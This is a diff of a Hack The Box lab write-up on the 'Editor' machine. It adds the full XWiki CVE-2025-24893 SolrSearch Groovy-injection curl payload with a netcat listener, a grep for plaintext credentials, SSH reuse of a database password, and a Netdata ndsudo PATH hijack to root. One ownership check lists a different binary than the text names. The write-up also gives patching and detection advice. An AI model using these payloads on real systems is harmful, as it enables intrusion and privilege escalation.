@@ -1,5 +1,5 @@
 ---
-title: "CMS CVE-2025-24893 to Monitoring-Agent PATH Hijack"
+title: "Editor — XWiki CVE-2025-24893 RCE to Netdata ndsudo PATH Hijack"
 description: "XWiki SolrSearch unauthenticated Groovy code execution (CVE-2025-24893) provides a foothold; reused database credentials enable SSH, and a SUID Netdata ndsudo helper is hijacked through PATH to reach root."
 type: case-study
 platform: Hack The Box
@@ -12,40 +12,67 @@ tags:
   - xwiki
   - cve
   - path-hijack
+objective: "Obtain user and root control of an Ubuntu lab host through a vulnerable XWiki instance, cross-service credential reuse, and a SUID monitoring helper that trusts the caller's PATH."
+tools:
+  - rustscan
+  - gobuster
+  - curl
+  - netcat
+  - ssh
+  - grep
+  - suid3num
+skill: "Unauthenticated web application exploitation and Linux privilege escalation via credential reuse and an unsafe SUID helper search path"
+outcome: "Unauthenticated code execution as the XWiki service user, SSH access as a local account via a reused database password, and root command execution through the SUID Netdata ndsudo helper"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Medium |
+| Target environment | Ubuntu Linux; XWiki Debian 15.10.8 behind nginx and Jetty 10.0.20 |
+| Starting position | Unauthenticated network access |
+| Objective | Reach user and root control through a vulnerable XWiki instance, credential reuse, and a SUID monitoring helper |
+| Outcome | Unauthenticated code execution as the XWiki service user, SSH access as a local account, and root command execution via the SUID Netdata `ndsudo` helper |
 
 ## Summary
 
-This Linux lab hosts XWiki behind an nginx reverse proxy. Enumeration identifies `<WIKI_HOST>`, running XWiki Debian 15.10.8, vulnerable to CVE-2025-24893 — an unauthenticated Groovy code execution flaw in the SolrSearch endpoint. The foothold exposes database credentials reused by a local SSH user. Privilege escalation abuses a SUID `ndsudo` helper from Netdata, whose PATH-based dependency resolution permits binary hijacking to obtain root.
+Editor is a Medium-rated Hack The Box Linux lab hosting XWiki behind an nginx virtual host. Enumeration exposes the wiki vhost running XWiki Debian 15.10.8, vulnerable to CVE-2025-24893 — unauthenticated Groovy code execution through the `SolrSearch` endpoint. The foothold exposes XWiki database credentials that a local account reuses for SSH, and privilege escalation abuses a SUID Netdata `ndsudo` helper whose `PATH`-based dependency resolution permits binary hijacking to obtain root. Credential values, host and address identifiers, and callback details are replaced with role-based placeholders; command syntax is preserved.
+
+**Attack path:** **unauthenticated XWiki `SolrSearch` RCE (CVE-2025-24893) → `hibernate.cfg.xml` database credential recovery → SSH access via credential reuse → SUID Netdata `ndsudo` `PATH` hijack → root**
 
 ## Context and Objective
 
-The lab targets a Linux (Ubuntu) host with three open ports: SSH (22), nginx (80), and Jetty/XWiki (8080). An nginx virtual host configuration routes `<WIKI_HOST>` to the XWiki instance. The objective is to achieve user and root compromise through the identified attack surface.
-
-Scope constraints:
-
-- XWiki version 15.10.8 — vulnerable to CVE-2025-24893.
-- Local user `<LOCAL_USER>` exists with reused XWiki database credentials.
-- Netdata agent installed with SUID root helpers callable by the `netdata` group.
+- **Target:** an Ubuntu Linux host exposing SSH (22), nginx (80), and Jetty/XWiki (8080).
+- **Application:** nginx routes `<WIKI_HOST>` to an XWiki Debian 15.10.8 instance served by Jetty 10.0.20.
+- **Starting position:** unauthenticated network access, with no provided credentials.
+- **Objective:** move from the exposed web application to user and root control, and demonstrate the impact of an unpatched macro-injection flaw, credential reuse, and an unsafe privileged helper.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
-### Stage 1 — Service Discovery and Virtual Host Enumeration
+### 1. Service Discovery and Virtual Host Enumeration
 
-An initial Rustscan identifies three open ports. Port 80 redirects to `<TARGET_HOST>`; port 8080 exposes XWiki directly via Jetty 10.0.20.
+Observation: a full port scan exposes three services, and port 8080 serves XWiki directly.
 
 ```bash
-rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/target-TCP
+rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <OUT_FILE>
 ```
 
 ```text
-PORT     STATE SERVICE REASON         VERSION
-22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
-80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0
-8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
+80/tcp   open  http    nginx 1.18.0
+8080/tcp open  http    Jetty 10.0.20
 ```
 
-Virtual host fuzzing with Gobuster reveals a subdomain:
+The port 8080 banner identifies the application as XWiki:
+
+```text
+| http-title: XWiki - Main - Intro
+|_Requested resource was http://<TARGET_IP>:8080/xwiki/bin/view/Main/
+```
+
+Virtual-host fuzzing reveals the wiki subdomain:
 
 ```bash
 gobuster vhost \
@@ -58,21 +85,35 @@ gobuster vhost \
 <WIKI_HOST> Status: 302 [Size: 0] [--> http://<WIKI_HOST>/xwiki]
 ```
 
-Adding `<WIKI_HOST>` to `/etc/hosts` and browsing confirms XWiki Debian 15.10.8.
+Significance: the port-80 service redirects to the base virtual host, while the discovered virtual host reaches the XWiki application, and the `8080` banner identifies both the product and its container.
 
-### Stage 2 — CVE-2025-24893: XWiki Groovy Code Execution
+Result: the wiki vhost (`<WIKI_HOST>`) is identified and resolves to an XWiki Debian 15.10.8 instance.
 
-The XWiki SolrSearch endpoint is vulnerable to a template injection that can chain into Groovy execution. The technique closes the current XWiki syntax context, opens async and Groovy macros, then attempts command execution.
+### 2. CVE-2025-24893 — Unauthenticated XWiki Groovy Code Execution
 
-```text
-Technique pattern: a SolrSearch text parameter contains syntax-context closure and async/Groovy macro invocation. Unsafe command and callback details omitted.
+Observation: the XWiki `SolrSearch` endpoint evaluates request input as wiki syntax, and CVE-2025-24893 lets an unauthenticated guest chain that evaluation into Groovy execution.
+
+Action: start a listener and trigger execution through a `SolrSearch` request that closes the current syntax context and nests async and Groovy macros around a command wrapper.
+
+```bash
+nc -nlvp <LISTENER_PORT>
 ```
 
-This technique can provide execution in the XWiki service context when the vulnerable endpoint is exposed.
+```bash
+curl -G 'http://<WIKI_HOST>/xwiki/bin/get/Main/SolrSearch' \
+  --data-urlencode 'media=rss' \
+  --data-urlencode 'text=}}}{{async async=false}}{{groovy}}<GROOVY_COMMAND_WRAPPER>.execute(){{/groovy}}{{/async}}'
+```
 
-### Stage 3 — Credential Discovery and User Escalation
+The source records a shell as the XWiki service user; no terminal output for this step was retained.
 
-Searching common configuration paths for credential patterns reveals plaintext database credentials:
+Significance: the flaw executes in the XWiki service context without authentication, exposing the application's configuration and the database credentials it holds.
+
+Result: unauthenticated code execution is obtained as the XWiki service user.
+
+### 3. Credential Discovery and SSH Access
+
+Observation: the XWiki configuration stores its database password in plaintext.
 
 ```bash
 grep -rn --include="*.xml" -i "password\|credential" /etc /var /opt 2>/dev/null
@@ -82,7 +123,7 @@ grep -rn --include="*.xml" -i "password\|credential" /etc /var /opt 2>/dev/null
 /etc/xwiki/hibernate.cfg.xml:104:    <property name="hibernate.connection.password"><XWIKI_DB_PASSWORD></property>
 ```
 
-The discovered password is reused by the local user `<LOCAL_USER>`, enabling SSH access:
+The same password authenticates over SSH for the local account, which shares the secret:
 
 ```bash
 ssh <LOCAL_USER>@<TARGET_HOST>
@@ -92,19 +133,33 @@ ssh <LOCAL_USER>@<TARGET_HOST>
 <LOCAL_USER>@<TARGET_HOST>:~$
 ```
 
-### Stage 4 — SUID Enumeration and Netdata PATH Hijack
+Significance: a database secret that should be scoped to the application also protects an interactive account, so a configuration disclosure becomes host access without a further exploit.
 
-Running SUID discovery identifies Netdata helpers installed with the SUID bit:
+Result: an authenticated shell is obtained as `<LOCAL_USER>` using the reused database password.
+
+### 4. SUID Enumeration and Netdata `ndsudo` PATH Hijack
+
+Observation: SUID discovery lists a Netdata plugin helper installed with the SUID bit.
 
 ```bash
-find / -perm -4000 2>/dev/null
+python3 suid3num.py
 ```
 
 ```text
 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
 ```
 
-The user `<LOCAL_USER>` is a member of the `netdata` group, which grants access to these SUID binaries:
+The helper is owned by root and group `netdata`:
+
+```bash
+ls -l /opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
+```
+
+```text
+-rwsr-x--- 1 root netdata 965056 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
+```
+
+The local account is a member of the `netdata` group:
 
 ```bash
 id
@@ -114,7 +169,9 @@ id
 uid=1000(<LOCAL_USER>) gid=1000(<LOCAL_USER>) groups=1000(<LOCAL_USER>),999(netdata)
 ```
 
-`ndsudo` supports an `nvme-list` action that resolves the `nvme` binary through the caller-controlled `PATH`. By placing a custom `nvme` binary — a setuid root shell — in a controlled directory prepended to `PATH`, the SUID helper executes the attacker binary as root:
+Significance: membership in `netdata` lets the low-privileged account execute the SUID helpers, and `ndsudo` resolves its `nvme` dependency through the caller-controlled `PATH` — the documented untrusted-search-path issue CVE-2024-32019.
+
+Action: place a malicious `nvme` binary in a controlled directory, prepend it to `PATH`, and invoke the helper's `nvme-list` action.
 
 ```bash
 export PATH=/tmp/fakebin:$PATH
@@ -122,26 +179,41 @@ export PATH=/tmp/fakebin:$PATH
 ```
 
 ```text
-root@<TARGET_HOST>:/home/<LOCAL_USER>#
+root@<TARGET_HOST>:/home/<LOCAL_USER># id
+uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(<LOCAL_USER>)
 ```
+
+Significance: the helper runs as root and trusts `PATH`, so the caller-controlled binary executes with root privileges — a direct privilege-boundary failure in a legitimate monitoring component.
+
+Result: root command execution is confirmed by the root `id` output.
 
 ## Challenges and Decisions
 
-- The initial `SolrSearch` technique requires careful XWiki syntax escaping before the async/Groovy macro pair can be invoked.
-- Status validation required corroborating available retirement information before inclusion.
+| Challenge | Decision | Rationale |
+|---|---|---|
+| The `SolrSearch` parameter is parsed as wiki syntax | Closed the syntax context, then nested async and Groovy macros around the command wrapper | The Groovy step only runs once the parameter is parsed as nested macros |
+| The SUID helper resolves `nvme` through the caller's `PATH` | Prepended a controlled directory containing a malicious `nvme` to `PATH` before running `nvme-list` | The helper trusted `PATH`, so the first matching binary was executed as root |
 
 ## Outcome
 
-The machine demonstrates a complete attack chain: unauthenticated web RCE via CVE-2025-24893, credential reuse for local user escalation, and SUID binary PATH hijacking for root. Both user and root flags were obtained.
+The evidence establishes root-level command execution on the host, reached through unauthenticated code execution in the XWiki service context and a database password that also authenticated SSH for the local account. The escalation rests on an unpatched macro-injection flaw, credential reuse across services, and a SUID helper that resolved a dependency through the caller's `PATH`.
 
 ## Lessons and Recommendations
 
-- **Patch XWiki promptly.** CVE-2025-24893 allows unauthenticated code execution; upgrade to a patched version and restrict access to macro-execution endpoints.
-- **Avoid credential reuse across services.** Database passwords must not double as interactive user credentials. Use unique, scoped credentials stored with least privilege.
-- **Audit SUID binaries for PATH safety.** SUID helpers must resolve dependencies by absolute path. PATH-based resolution in privileged binaries is a privilege escalation vector.
-- **Restrict service group membership.** Membership in the `netdata` group grants interaction with privileged helpers. Group membership should follow least-privilege principles.
+Each finding pairs the observed root cause with its demonstrated impact and a prioritized action. The actions are recommendations; none was validated in the lab.
+
+1. **Unpatched XWiki macro injection (CVE-2025-24893).** A guest could reach code execution through `SolrSearch` on the exposed instance. *Recommendation:* upgrade to a fixed release (15.10.11, 16.4.1, or 16.5.0RC1) and restrict access to macro-execution endpoints. *Detection:* monitor requests to `SolrSearch` and unexpected `groovy`/`async` macro content in request parameters.
+2. **Database password reused as an interactive credential.** The XWiki database password authenticated SSH for `<LOCAL_USER>`. *Recommendation:* issue unique, least-privilege credentials per service, never reuse application secrets for interactive accounts, and rotate any secret exposed in configuration. *Detection:* scan configuration and secret stores for credentials reused across services.
+3. **SUID helper with an untrusted search path.** Netdata `ndsudo` executed the first `nvme` binary found in the caller's `PATH` with root privileges (CVE-2024-32019). *Recommendation:* resolve privileged dependencies by absolute path, sanitize `PATH` inside SUID binaries, and update Netdata to a fixed release. *Detection:* audit SUID helpers for `PATH`-based resolution and monitor privileged child-process execution from monitoring agents.
+4. **Over-broad service group membership.** Membership in `netdata` allowed the low-privileged account to run the SUID helpers. *Recommendation:* keep `netdata` group membership limited to the service account and review it against least privilege. *Detection:* alert on changes to service group membership.
 
 ## References
 
-- [CVE-2025-24893 — XWiki SolrSearch Groovy Code Execution](https://nvd.nist.gov/vuln/detail/CVE-2025-24893)
-- Hack The Box retired Linux machine — [Editor](https://app.hackthebox.com/machines/Editor)
+- [Hack The Box — Editor](https://app.hackthebox.com/machines/Editor) (retired machine)
+- [NVD — CVE-2025-24893](https://nvd.nist.gov/vuln/detail/CVE-2025-24893) (XWiki `SolrSearch` remote code execution)
+- [XWiki security advisory — GHSA-rr6p-3pfg-562j](https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-rr6p-3pfg-562j) (vendor advisory and patched versions)
+- [NVD — CVE-2024-32019](https://nvd.nist.gov/vuln/detail/CVE-2024-32019) (Netdata `ndsudo` untrusted search path)
+- [Netdata security advisory — GHSA-pmhq-4cxq-wj93](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93) (vendor advisory)
+- [RustScan](https://github.com/RustScan/RustScan) (port scanner)
+- [Gobuster](https://github.com/OJ/gobuster) (virtual-host and content discovery)
+- [SUID3NUM](https://github.com/Anon-Exploiter/SUID3NUM) (SUID binary enumeration)
